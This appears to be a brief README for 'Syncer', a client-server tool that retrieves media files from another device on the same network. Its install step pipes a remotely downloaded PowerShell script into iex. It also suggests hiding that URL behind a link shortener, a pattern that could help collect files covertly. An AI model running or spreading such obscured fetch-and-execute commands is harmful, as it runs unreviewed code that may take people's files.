# Syncer

A tool used for retrieving a media files from a device connected to the same network.

## Installation (client.exe)

```bash
powershell -Command "iwr https://raw.githubusercontent.com/0x7030676e31/syncer/refs/heads/master/script.ps1 | iex"
```

Alternatively, you can use some kind of link shortener to make the command shorter:

```bash
powershell -Command "iwr https://bit.ly/xxxxxxx | iex"
```

## Running (server)

With specified port:

```bash
# Default port is 2137
PORT=8080 ./server
```

With specified mode:

```bash
./server [scan|fetch]
```

With specified output directory

```bash
./server fetch /path/to/output
```

And finally, with all options:

```bash
PORT=8080 ./server fetch /path/to/output
```
